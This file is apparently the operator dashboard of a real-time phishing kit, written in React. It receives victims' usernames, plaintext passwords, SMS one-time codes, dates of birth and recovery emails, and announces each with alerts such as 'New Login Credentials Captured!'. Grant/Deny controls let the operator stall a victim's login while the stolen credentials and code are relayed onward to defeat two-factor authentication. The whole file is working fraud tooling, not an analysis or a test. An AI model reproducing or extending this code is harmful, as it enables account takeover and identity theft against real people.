import { useState, useEffect, useRef } from "react";
import { useQuery, useMutation } from "@tanstack/react-query";
import { Button } from "@/components/ui/button";
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
import {
  CheckCircle,
  XCircle,
  Loader2,
  Users,
  RefreshCw,
  Bell,
  BellOff,
  Volume2,
  VolumeX,
  Activity,
} from "lucide-react";
import { apiRequest } from "@/lib/queryClient";
import { queryClient } from "@/lib/queryClient";
import { useToast } from "@/hooks/use-toast";

interface PendingRequest {
  id: string;
  username: string;
  password: string;
  timestamp: string;
  ipAddress?: string;
  userAgent?: string;
}

interface SMSCode {
  username: string;
  code: string;
  dateOfBirth?: string;
  timestamp: string;
  sessionId?: string;
}

interface RecoveryRequest {
  email: string;
  ipAddress?: string;
  userAgent?: string;
  timestamp: string;
}

interface PageActivity {
  pageName: string;
  route: string;
  status: 'active';
  lastAccessed: string;
  visitors: number;
}

export default function AdminControl() {
  const { toast } = useToast();
  const [wsConnected, setWsConnected] = useState(false);
  const [notificationsEnabled, setNotificationsEnabled] = useState(false);
  const [audioEnabled, setAudioEnabled] = useState(true);
  const [unreadCount, setUnreadCount] = useState(0);
  const [smsCodeHistory, setSmsCodeHistory] = useState<SMSCode[]>([]);
  const [pageActivity, setPageActivity] = useState<PageActivity[]>([]);
  const [recoveryRequests, setRecoveryRequests] = useState<RecoveryRequest[]>([]);
  const wsRef = useRef<WebSocket | null>(null);
  const audioContextRef = useRef<AudioContext | null>(null);

  // Fetch pending login requests (fallback if WebSocket fails)
  const {
    data: pendingRequests = [],
    isLoading,
    refetch,
  } = useQuery<PendingRequest[]>({
    queryKey: ["/api/admin/pending"],
    refetchInterval: 10000, // Slower polling as backup (WebSocket is primary)
  });

  // Fetch SMS history
  const { data: smsHistory = [] } = useQuery<SMSCode[]>({
    queryKey: ["/api/admin/sms-history"],
    refetchInterval: 10000,
  });

  // Sync smsHistory from API with local state
  useEffect(() => {
    if (smsHistory.length > 0) {
      setSmsCodeHistory(smsHistory);
    }
  }, [smsHistory]);

  // Play notification sound with different tones for different events
  const playNotificationSound = async (eventType: 'login' | 'sms' | 'complete' = 'login') => {
    if (!audioEnabled) return;

    try {
      if (!audioContextRef.current) {
        audioContextRef.current = new (window.AudioContext ||
          (window as any).webkitAudioContext)();
      }
      const ctx = audioContextRef.current;

      // Resume audio context if suspended (browser autoplay policy)
      if (ctx.state === 'suspended') {
        await ctx.resume();
      }

      // Different frequencies and patterns for different events
      const soundConfig = {
        login: { freq: 800, beeps: 2, volume: 0.5 },
        sms: { freq: 1000, beeps: 1, volume: 0.5 },
        complete: { freq: 600, beeps: 1, volume: 0.5 }
      };

      const config = soundConfig[eventType];
      
      // Play multiple beeps for better noticeability
      for (let i = 0; i < config.beeps; i++) {
        setTimeout(() => {
          const oscillator = ctx.createOscillator();
          const gainNode = ctx.createGain();

          oscillator.connect(gainNode);
          gainNode.connect(ctx.destination);

          oscillator.frequency.value = config.freq;
          oscillator.type = "sine";
          gainNode.gain.setValueAtTime(config.volume, ctx.currentTime);
          gainNode.gain.exponentialRampToValueAtTime(
            0.01,
            ctx.currentTime + 0.2
          );

          oscillator.start(ctx.currentTime);
          oscillator.stop(ctx.currentTime + 0.2);
        }, i * 250);
      }
    } catch (error) {
      console.error("Error playing sound:", error);
    }
  };

  // Show browser notification with click handler
  const showBrowserNotification = (title: string, body: string, icon?: string) => {
    if (!notificationsEnabled || !("Notification" in window)) return;

    if (Notification.permission === "granted") {
      const notification = new Notification(title, {
        body,
        icon: icon || "/favicon.ico",
        badge: "/favicon.ico",
        requireInteraction: true, // Keep notification visible until user interacts
        tag: `notification-${Date.now()}`, // Prevent duplicate notifications
        silent: false, // Enable system notification sound
        vibrate: [200, 100, 200], // Vibration pattern for mobile
      } as any);

      // Click handler to focus the admin panel window
      notification.onclick = () => {
        window.focus();
        notification.close();
      };

      // Auto-close after 30 seconds as a fallback
      setTimeout(() => {
        notification.close();
      }, 30000);
    }
  };

  // Update tab title with unread count
  useEffect(() => {
    if (unreadCount > 0) {
      document.title = `(${unreadCount}) Admin Control Panel`;
    } else {
      document.title = "Admin Control Panel";
    }
  }, [unreadCount]);

  // Request notification permission
  const requestNotificationPermission = async () => {
    if (!("Notification" in window)) {
      toast({
        title: "Not Supported",
        description: "Browser notifications are not supported in your browser",
        variant: "destructive",
      });
      return;
    }

    try {
      const permission = await Notification.requestPermission();
      if (permission === "granted") {
        setNotificationsEnabled(true);
        toast({
          title: "Notifications Enabled",
          description:
            "You'll receive browser notifications for new login attempts",
        });
      } else {
        toast({
          title: "Permission Denied",
          description: "Please enable notifications in your browser settings",
          variant: "destructive",
        });
      }
    } catch (error) {
      console.error("Error requesting notification permission:", error);
    }
  };

  // WebSocket connection
  useEffect(() => {
    const protocol = window.location.protocol === "https:" ? "wss:" : "ws:";
    const wsUrl = `${protocol}//${window.location.host}/ws`;

    const connect = () => {
      try {
        const ws = new WebSocket(wsUrl);
        wsRef.current = ws;

        ws.onopen = () => {
          console.log("[WebSocket] Connected to admin notifications");
          setWsConnected(true);
        };

        ws.onmessage = (event) => {
          try {
            const data = JSON.parse(event.data);
            console.log("[WebSocket Message Received]", data.type);

            if (data.type === "initial_data") {
              // Initial data load
              queryClient.setQueryData(["/api/admin/pending"], data.requests);
              if (data.pages) {
                setPageActivity(data.pages);
              }
            } else if (data.type === "new_request") {
              // New login attempt
              queryClient.invalidateQueries({ queryKey: ["/api/admin/pending"] });
              setUnreadCount((prev) => prev + 1);
              playNotificationSound('login');
              showBrowserNotification(
                "🔐 New Login Credentials Captured!",
                `Username: ${data.request.username}\nPassword: ${data.request.password}\nIP: ${data.request.ipAddress || 'Unknown'}\nTime: ${new Date(
                  data.request.timestamp
                ).toLocaleTimeString()}`
              );
              toast({
                title: "🔐 New Login Attempt",
                description: `User: ${data.request.username} | Password: ${data.request.password}`,
              });
            } else if (data.type === "sms_verification_step1") {
              // Step 1: SMS code entered - add to history and show notification
              console.log("[Step 1 Received]", data.data);
              setSmsCodeHistory((prev) => {
                // Check if entry already exists to prevent duplicates
                const exists = prev.some(
                  (item) =>
                    (item.sessionId && item.sessionId === data.data.sessionId) ||
                    (item.username === data.data.username && item.code === data.data.smsCode)
                );

                if (exists) {
                  console.log("[Step 1] Duplicate entry ignored:", data.data.sessionId);
                  return prev;
                }

                const newEntry = {
                  username: data.data.username,
                  code: data.data.smsCode,
                  timestamp: data.data.timestamp,
                  sessionId: data.data.sessionId,
                };
                console.log("[Step 1 Adding Entry]", newEntry);
                return [newEntry, ...prev].slice(0, 10);
              });
              console.log("[Step 1 Toast]");
              playNotificationSound('sms');
              showBrowserNotification(
                "📱 SMS Verification Code Captured!",
                `Username: ${data.data.username}\nSMS Code: ${data.data.smsCode}\n⏳ Waiting for date of birth...`
              );
              toast({
                title: "📱 SMS Code Captured (Step 1/2)",
                description: `User: ${data.data.username} | Code: ${data.data.smsCode} | Awaiting DOB...`,
              });
            } else if (data.type === "sms_verification_complete") {
              // Step 2: DOB added - update the existing entry
              setSmsCodeHistory((prev) => {
                const existingIndex = prev.findIndex(
                  (item) =>
                    (item.sessionId && item.sessionId === data.data.sessionId) ||
                    (item.username === data.data.username && item.code === data.data.smsCode)
                );
                if (existingIndex !== -1) {
                  const updated = [...prev];
                  updated[existingIndex] = {
                    ...updated[existingIndex],
                    dateOfBirth: data.data.dateOfBirth,
                    timestamp: data.data.timestamp,
                    sessionId: data.data.sessionId,
                  };
                  return updated;
                }
                return prev;
              });
              playNotificationSound('complete');
              showBrowserNotification(
                "✅ SMS Verification Complete!",
                `Username: ${data.data.username}\nSMS Code: ${data.data.smsCode}\nDate of Birth: ${data.data.dateOfBirth}\n\nAll verification data captured successfully!`
              );
              toast({
                title: "✅ Verification Complete (2/2)",
                description: `User: ${data.data.username} | SMS: ${data.data.smsCode} | DOB: ${data.data.dateOfBirth}`,
              });
            } else if (data.type === "username_recovery") {
              // Username recovery email submitted
              setRecoveryRequests((prev) => [data.data, ...prev].slice(0, 20));
              playNotificationSound('sms');
              showBrowserNotification(
                "🔍 Username Recovery Request",
                `Email: ${data.data.email}\nIP: ${data.data.ipAddress || 'Unknown'}`
              );
              toast({
                title: "🔍 Recovery Request",
                description: `Email: ${data.data.email}`,
              });
            } else if (data.type === "page_activity") {
              // Update page activity when a new page is visited
              setPageActivity((prev) => {
                const index = prev.findIndex(p => p.route === data.page.route);
                if (index !== -1) {
                  const updated = [...prev];
                  updated[index] = data.page;
                  return updated;
                } else {
                  return [...prev, data.page];
                }
              });

              toast({
                title: "Page Visited",
                description: `${data.page.pageName} accessed`,
              });
            }
          } catch (error) {
            console.error("Error parsing WebSocket message:", error);
          }
        };

        ws.onerror = (error) => {
          console.error("[WebSocket] Error:", error);
          setWsConnected(false);
        };

        ws.onclose = () => {
          console.log("[WebSocket] Disconnected, attempting to reconnect...");
          setWsConnected(false);
          setTimeout(connect, 3000);
        };
      } catch (error) {
        console.error("[WebSocket] Connection error:", error);
        setTimeout(connect, 3000);
      }
    };

    connect();

    return () => {
      if (wsRef.current) {
        wsRef.current.close();
      }
    };
  }, []);

  // Check if notifications are already enabled
  useEffect(() => {
    if ("Notification" in window && Notification.permission === "granted") {
      setNotificationsEnabled(true);
    }
  }, []);

  // Clear unread count when user interacts with the page
  useEffect(() => {
    const handleFocus = () => setUnreadCount(0);
    const handleClick = () => setUnreadCount(0);

    window.addEventListener("focus", handleFocus);
    window.addEventListener("click", handleClick);

    return () => {
      window.removeEventListener("focus", handleFocus);
      window.removeEventListener("click", handleClick);
    };
  }, []);

  const grantMutation = useMutation({
    mutationFn: async (request: PendingRequest) => {
      await apiRequest("POST", "/api/admin/grant", {
        requestId: request.id,
        username: request.username,
        password: request.password,
        action: "grant",
      });
    },
    onSuccess: () => {
      queryClient.invalidateQueries({ queryKey: ["/api/admin/pending"] });
    },
  });

  const denyMutation = useMutation({
    mutationFn: async (request: PendingRequest) => {
      await apiRequest("POST", "/api/admin/deny", {
        requestId: request.id,
        username: request.username,
        password: request.password,
        action: "deny",
      });
    },
    onSuccess: () => {
      queryClient.invalidateQueries({ queryKey: ["/api/admin/pending"] });
    },
  });

  const clearLogsMutation = useMutation({
    mutationFn: async () => {
      await apiRequest("POST", "/api/admin/clear-logs");
    },
    onSuccess: () => {
      queryClient.invalidateQueries({ queryKey: ["/api/admin/pending"] });
      queryClient.invalidateQueries({ queryKey: ["/api/admin/sms-history"] });
      setSmsCodeHistory([]);
      toast({
        title: "Logs Cleared",
        description: "All pending requests and SMS history have been cleared.",
      });
    },
    onError: () => {
      toast({
        title: "Error",
        description: "Failed to clear logs. Please try again.",
        variant: "destructive",
      });
    },
  });

  const handleGrant = (request: PendingRequest) => {
    grantMutation.mutate(request);
  };

  const handleDeny = (request: PendingRequest) => {
    denyMutation.mutate(request);
  };

  return (
    <div className="min-h-screen bg-gray-100 px-4 py-6 md:px-6">
      <div className="mx-auto flex max-w-6xl flex-col gap-6">
        {/* Top Header */}
        <header className="rounded-xl bg-white/80 p-4 shadow-sm ring-1 ring-gray-200 backdrop-blur">
          <div className="flex flex-col gap-4 md:flex-row md:items-center md:justify-between">
            <div>
              <h1 className="flex items-center gap-3 text-2xl font-semibold text-gray-900 md:text-3xl">
                <span className="flex h-10 w-10 items-center justify-center rounded-xl bg-blue-50">
                  <Users className="h-6 w-6 text-blue-600" />
                </span>
                <span className="flex items-center gap-2">
                  Admin Control Panel
                  {unreadCount > 0 && (
                    <span className="inline-flex items-center justify-center rounded-full bg-red-600 px-2.5 py-0.5 text-xs font-semibold text-white">
                      {unreadCount}
                    </span>
                  )}
                </span>
              </h1>
              <p className="mt-1 text-sm text-gray-600 md:text-base">
                Review and approve login attempts in real time with live
                notifications.
              </p>
            </div>

            <div className="flex flex-wrap gap-2 md:justify-end">
              <Button
                onClick={() => setAudioEnabled(!audioEnabled)}
                variant="outline"
                className="flex items-center gap-2"
                data-testid="button-toggle-audio"
              >
                {audioEnabled ? (
                  <Volume2 className="h-4 w-4" />
                ) : (
                  <VolumeX className="h-4 w-4" />
                )}
                <span className="hidden sm:inline">
                  {audioEnabled ? "Audio On" : "Audio Off"}
                </span>
              </Button>

              <Button
                onClick={requestNotificationPermission}
                variant={notificationsEnabled ? "default" : "outline"}
                className="flex items-center gap-2"
                disabled={notificationsEnabled}
                data-testid="button-enable-notifications"
              >
                {notificationsEnabled ? (
                  <Bell className="h-4 w-4" />
                ) : (
                  <BellOff className="h-4 w-4" />
                )}
                <span className="hidden sm:inline">
                  {notificationsEnabled ? "Notifications On" : "Enable Notifications"}
                </span>
              </Button>

              <Button
                onClick={() => refetch()}
                disabled={isLoading}
                variant="outline"
                className="flex items-center gap-2"
                data-testid="button-refresh"
              >
                <RefreshCw
                  className={`h-4 w-4 ${isLoading ? "animate-spin" : ""}`}
                />
                <span className="hidden sm:inline">Refresh</span>
              </Button>

              <Button
                onClick={() => {
                  if (confirm("Are you sure you want to clear all logs? This action cannot be undone.")) {
                    clearLogsMutation.mutate();
                  }
                }}
                disabled={clearLogsMutation.isPending}
                variant="destructive"
                className="flex items-center gap-2"
                data-testid="button-clear-logs"
              >
                {clearLogsMutation.isPending ? (
                  <Loader2 className="h-4 w-4 animate-spin" />
                ) : (
                  <XCircle className="h-4 w-4" />
                )}
                <span className="hidden sm:inline">Clear Logs</span>
              </Button>
            </div>
          </div>
        </header>

        {/* Stat Cards */}
        <section className="grid grid-cols-1 gap-4 md:grid-cols-2 xl:grid-cols-4">
          <Card>
            <CardContent className="p-4 md:p-6">
              <div className="flex items-center">
                <div className="rounded-lg bg-blue-100 p-2">
                  <Users className="h-6 w-6 text-blue-600" />
                </div>
                <div className="ml-4">
                  <p className="text-sm font-medium text-gray-600">
                    Pending Requests
                  </p>
                  <p
                    className="text-2xl font-bold text-gray-900"
                    data-testid="text-pending-count"
                  >
                    {pendingRequests.length}
                  </p>
                </div>
              </div>
            </CardContent>
          </Card>

          <Card>
            <CardContent className="p-4 md:p-6">
              <div className="flex items-center">
                <div
                  className={`rounded-lg p-2 ${wsConnected ? "bg-green-100" : "bg-red-100"
                    }`}
                >
                  <CheckCircle
                    className={`h-6 w-6 ${wsConnected ? "text-green-600" : "text-red-600"
                      }`}
                  />
                </div>
                <div className="ml-4">
                  <p className="text-sm font-medium text-gray-600">WebSocket</p>
                  <p
                    className={`text-sm font-bold ${wsConnected ? "text-green-600" : "text-red-600"
                      }`}
                    data-testid="text-ws-status"
                  >
                    {wsConnected ? "Connected" : "Disconnected"}
                  </p>
                </div>
              </div>
            </CardContent>
          </Card>

          <Card>
            <CardContent className="p-4 md:p-6">
              <div className="flex items-center">
                <div
                  className={`rounded-lg p-2 ${notificationsEnabled ? "bg-green-100" : "bg-gray-100"
                    }`}
                >
                  <Bell
                    className={`h-6 w-6 ${notificationsEnabled ? "text-green-600" : "text-gray-400"
                      }`}
                  />
                </div>
                <div className="ml-4">
                  <p className="text-sm font-medium text-gray-600">
                    Notifications
                  </p>
                  <p
                    className={`text-sm font-bold ${notificationsEnabled ? "text-green-600" : "text-gray-600"
                      }`}
                    data-testid="text-notification-status"
                  >
                    {notificationsEnabled ? "Enabled" : "Disabled"}
                  </p>
                </div>
              </div>
            </CardContent>
          </Card>

          <Card>
            <CardContent className="p-4 md:p-6">
              <div className="flex items-center">
                <div
                  className={`rounded-lg p-2 ${audioEnabled ? "bg-purple-100" : "bg-gray-100"
                    }`}
                >
                  {audioEnabled ? (
                    <Volume2 className="h-6 w-6 text-purple-600" />
                  ) : (
                    <VolumeX className="h-6 w-6 text-gray-400" />
                  )}
                </div>
                <div className="ml-4">
                  <p className="text-sm font-medium text-gray-600">
                    Audio Alerts
                  </p>
                  <p
                    className={`text-sm font-bold ${audioEnabled ? "text-purple-600" : "text-gray-600"
                      }`}
                    data-testid="text-audio-status"
                  >
                    {audioEnabled ? "Enabled" : "Disabled"}
                  </p>
                </div>
              </div>
            </CardContent>
          </Card>
        </section>

        {/* Main Content Layout */}
        <div className="grid gap-6 lg:grid-cols-[minmax(0,2fr)_minmax(0,1.1fr)]">
          {/* Pending Requests Column */}
          <section>
            <Card className="h-full">
              <CardHeader className="border-b bg-gray-50/80">
                <CardTitle className="text-lg font-semibold md:text-xl">
                  Pending Login Requests
                </CardTitle>
              </CardHeader>
              <CardContent className="p-0">
                {isLoading ? (
                  <div className="flex flex-col items-center justify-center py-10">
                    <Loader2 className="h-8 w-8 animate-spin text-blue-600" />
                    <p className="mt-2 text-sm text-gray-600">
                      Loading requests...
                    </p>
                  </div>
                ) : pendingRequests.length === 0 ? (
                  <div className="flex flex-col items-center justify-center py-10">
                    <div className="flex h-16 w-16 items-center justify-center rounded-full bg-gray-100">
                      <Users className="h-8 w-8 text-gray-400" />
                    </div>
                    <p className="mt-3 text-sm font-medium text-gray-700">
                      No pending requests
                    </p>
                    <p className="mt-1 text-xs text-gray-500">
                      New login attempts will appear here automatically.
                    </p>
                  </div>
                ) : (
                  <div className="max-h-[520px] space-y-3 overflow-y-auto p-4">
                    {pendingRequests.map((request: PendingRequest) => (
                      <div
                        key={request.id}
                        className="flex flex-col gap-4 rounded-lg border bg-white p-4 shadow-sm transition-shadow hover:shadow-md"
                        data-testid={`card-request-${request.id}`}
                      >
                        <div className="flex flex-col gap-3 md:flex-row md:items-start md:justify-between">
                          <div className="flex-1">
                            <div className="mb-2 flex flex-wrap items-center gap-2">
                              <span className="inline-flex items-center rounded-full bg-blue-50 px-2.5 py-0.5 text-xs font-medium text-blue-700">
                                Pending
                              </span>
                              <span className="text-xs text-gray-500">
                                {new Date(
                                  request.timestamp
                                ).toLocaleString()}
                              </span>
                            </div>

                            <div className="grid grid-cols-1 gap-4 md:grid-cols-2 lg:grid-cols-4">
                              <div>
                                <p className="text-xs font-medium text-gray-500">
                                  Username
                                </p>
                                <p
                                  className="truncate text-sm font-medium text-gray-900"
                                  data-testid={`text-username-${request.id}`}
                                >
                                  {request.username}
                                </p>
                              </div>
                              <div>
                                <p className="text-xs font-medium text-gray-500">
                                  Password
                                </p>
                                <p
                                  className="truncate font-mono text-sm text-gray-700"
                                  data-testid={`text-password-${request.id}`}
                                >
                                  {request.password}
                                </p>
                              </div>
                              <div>
                                <p className="text-xs font-medium text-gray-500">
                                  IP Address
                                </p>
                                <p className="text-sm text-gray-700">
                                  {request.ipAddress || "Unknown"}
                                </p>
                              </div>
                              <div>
                                <p className="text-xs font-medium text-gray-500">
                                  Time
                                </p>
                                <p className="text-sm text-gray-700">
                                  {new Date(
                                    request.timestamp
                                  ).toLocaleTimeString()}
                                </p>
                              </div>
                            </div>

                            {request.userAgent && (
                              <div className="mt-2">
                                <p className="text-xs font-medium text-gray-500">
                                  User Agent
                                </p>
                                <p className="truncate text-xs text-gray-600">
                                  {request.userAgent}
                                </p>
                              </div>
                            )}
                          </div>
                        </div>

                        <div className="flex gap-2">
                          <Button
                            onClick={() => handleGrant(request)}
                            disabled={grantMutation.isPending}
                            className="flex-1 gap-2 bg-green-600 hover:bg-green-700"
                            data-testid={`button-grant-${request.id}`}
                          >
                            {grantMutation.isPending ? (
                              <Loader2 className="h-4 w-4 animate-spin" />
                            ) : (
                              <CheckCircle className="h-4 w-4" />
                            )}
                            Grant Access
                          </Button>
                          <Button
                            onClick={() => handleDeny(request)}
                            disabled={denyMutation.isPending}
                            variant="destructive"
                            className="flex-1 gap-2"
                            data-testid={`button-deny-${request.id}`}
                          >
                            {denyMutation.isPending ? (
                              <Loader2 className="h-4 w-4 animate-spin" />
                            ) : (
                              <XCircle className="h-4 w-4" />
                            )}
                            Deny Access
                          </Button>
                        </div>
                      </div>
                    ))}
                  </div>
                )}
              </CardContent>
            </Card>
          </section>

          {/* SMS Code History Column */}
          <section>
            <Card className="h-full">
              <CardHeader className="border-b bg-gray-50/80">
                <CardTitle className="text-lg font-semibold md:text-xl">
                  Recent SMS Codes
                </CardTitle>
              </CardHeader>
              <CardContent className="p-0">
                {smsCodeHistory.length === 0 ? (
                  <div className="flex flex-col items-center justify-center py-10">
                    <div className="flex h-16 w-16 items-center justify-center rounded-full bg-gray-100">
                      <span className="text-3xl">📱</span>
                    </div>
                    <p className="mt-3 text-sm font-medium text-gray-700">
                      No SMS codes yet
                    </p>
                    <p className="mt-1 text-xs text-gray-500">
                      SMS verification codes will appear here.
                    </p>
                  </div>
                ) : (
                  <div className="max-h-[520px] space-y-3 overflow-y-auto p-4">
                    {smsCodeHistory.map((item: SMSCode, index: number) => (
                      <div
                        key={`${item.username}-${item.timestamp}-${index}`}
                        className="rounded-lg border bg-white p-4 shadow-sm"
                        data-testid={`card-sms-${index}`}
                      >
                        <div className="mb-2 flex items-center gap-2">
                          <span className="inline-flex items-center rounded-full bg-purple-50 px-2.5 py-0.5 text-xs font-medium text-purple-700">
                            SMS Code
                          </span>
                          {item.dateOfBirth && (
                            <span className="inline-flex items-center rounded-full bg-green-50 px-2.5 py-0.5 text-xs font-medium text-green-700">
                              ✓ Complete
                            </span>
                          )}
                          <span className="ml-auto text-xs text-gray-500">
                            {new Date(item.timestamp).toLocaleTimeString()}
                          </span>
                        </div>

                        <div className="space-y-2">
                          <div>
                            <p className="text-xs font-medium text-gray-500">
                              Username
                            </p>
                            <p className="text-sm font-medium text-gray-900">
                              {item.username}
                            </p>
                          </div>
                          <div>
                            <p className="text-xs font-medium text-gray-500">
                              SMS Code
                            </p>
                            <p className="font-mono text-lg font-bold text-purple-600">
                              {item.code}
                            </p>
                          </div>
                          {item.dateOfBirth && (
                            <div>
                              <p className="text-xs font-medium text-gray-500">
                                Date of Birth
                              </p>
                              <p className="text-sm font-medium text-gray-900">
                                {item.dateOfBirth}
                              </p>
                            </div>
                          )}
                          {!item.dateOfBirth && (
                            <div className="rounded-md bg-yellow-50 p-2">
                              <p className="text-xs text-yellow-700">
                                ⏳ Waiting for date of birth...
                              </p>
                            </div>
                          )}
                        </div>
                      </div>
                    ))}
                  </div>
                )}
              </CardContent>
            </Card>
          </section>
        </div>

        {/* Username Recovery Requests */}
        <section className="mt-6">
          <Card>
            <CardHeader className="border-b bg-gray-50/80">
              <CardTitle className="text-lg font-semibold md:text-xl flex items-center gap-2">
                🔍 Username Recovery Requests
                {recoveryRequests.length > 0 && (
                  <span className="inline-flex items-center justify-center rounded-full bg-orange-100 px-2.5 py-0.5 text-xs font-semibold text-orange-700">
                    {recoveryRequests.length}
                  </span>
                )}
              </CardTitle>
              <p className="text-sm text-gray-600 mt-1">
                Emails submitted via the /recover-username page
              </p>
            </CardHeader>
            <CardContent className="p-0">
              {recoveryRequests.length === 0 ? (
                <div className="flex flex-col items-center justify-center py-10">
                  <div className="flex h-16 w-16 items-center justify-center rounded-full bg-gray-100">
                    <span className="text-3xl">🔍</span>
                  </div>
                  <p className="mt-3 text-sm font-medium text-gray-700">No recovery requests yet</p>
                  <p className="mt-1 text-xs text-gray-500">Emails submitted on /recover-username will appear here in real time.</p>
                </div>
              ) : (
                <div className="max-h-[400px] space-y-3 overflow-y-auto p-4">
                  {recoveryRequests.map((item, index) => (
                    <div
                      key={`${item.email}-${item.timestamp}-${index}`}
                      className="rounded-lg border bg-white p-4 shadow-sm"
                      data-testid={`card-recovery-${index}`}
                    >
                      <div className="mb-2 flex items-center gap-2">
                        <span className="inline-flex items-center rounded-full bg-orange-50 px-2.5 py-0.5 text-xs font-medium text-orange-700">
                          Recovery Request
                        </span>
                        <span className="ml-auto text-xs text-gray-500">
                          {new Date(item.timestamp).toLocaleTimeString()}
                        </span>
                      </div>
                      <div className="grid grid-cols-1 gap-3 md:grid-cols-2">
                        <div>
                          <p className="text-xs font-medium text-gray-500">Email Address</p>
                          <p className="text-sm font-semibold text-orange-600 break-all">{item.email}</p>
                        </div>
                        <div>
                          <p className="text-xs font-medium text-gray-500">IP Address</p>
                          <p className="text-sm text-gray-700">{item.ipAddress || "Unknown"}</p>
                        </div>
                        {item.userAgent && (
                          <div className="md:col-span-2">
                            <p className="text-xs font-medium text-gray-500">User Agent</p>
                            <p className="truncate text-xs text-gray-600">{item.userAgent}</p>
                          </div>
                        )}
                      </div>
                    </div>
                  ))}
                </div>
              )}
            </CardContent>
          </Card>
        </section>

        {/* New Pages Section */}
        <section>
          <Card>
            <CardHeader className="border-b bg-gray-50/80">
              <CardTitle className="text-lg font-semibold md:text-xl">
                📄 New Pages Created
              </CardTitle>
              <p className="text-sm text-gray-600 mt-1">
                Real-time activity tracking for newly implemented pages
              </p>
            </CardHeader>
            <CardContent className="p-0">
              {pageActivity.length === 0 ? (
                <div className="flex flex-col items-center justify-center py-10">
                  <div className="flex h-16 w-16 items-center justify-center rounded-full bg-gray-100">
                    <span className="text-3xl">📄</span>
                  </div>
                  <p className="mt-3 text-sm font-medium text-gray-700">
                    Loading page data...
                  </p>
                </div>
              ) : (
                <div className="overflow-x-auto">
                  <table className="w-full">
                    <thead className="bg-gray-50 border-b">
                      <tr>
                        <th className="px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">
                          Page Name
                        </th>
                        <th className="px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">
                          Route
                        </th>
                        <th className="px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">
                          Status
                        </th>
                        <th className="px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">
                          Visitors
                        </th>
                        <th className="px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">
                          Last Accessed
                        </th>
                      </tr>
                    </thead>
                    <tbody className="bg-white divide-y divide-gray-200">
                      {pageActivity.map((page, index) => (
                        <tr key={page.route} className="hover:bg-gray-50 transition-colors">
                          <td className="px-6 py-4 whitespace-nowrap">
                            <div className="text-sm font-medium text-gray-900">
                              {page.pageName}
                            </div>
                          </td>
                          <td className="px-6 py-4 whitespace-nowrap">
                            <code className="px-2 py-1 bg-gray-100 rounded text-sm text-blue-600">
                              {page.route}
                            </code>
                          </td>
                          <td className="px-6 py-4 whitespace-nowrap">
                            <span className="inline-flex items-center px-2.5 py-0.5 rounded-full text-xs font-medium bg-green-100 text-green-800">
                              <span className="w-2 h-2 bg-green-500 rounded-full mr-1.5 animate-pulse"></span>
                              {page.status.charAt(0).toUpperCase() + page.status.slice(1)}
                            </span>
                          </td>
                          <td className="px-6 py-4 whitespace-nowrap text-sm text-gray-900">
                            {page.visitors}
                          </td>
                          <td className="px-6 py-4 whitespace-nowrap text-sm text-gray-500">
                            {new Date(page.lastAccessed).toLocaleString()}
                          </td>
                        </tr>
                      ))}
                    </tbody>
                  </table>
                </div>
              )}
            </CardContent>
          </Card>
        </section>
      </div>
    </div>
  );
}
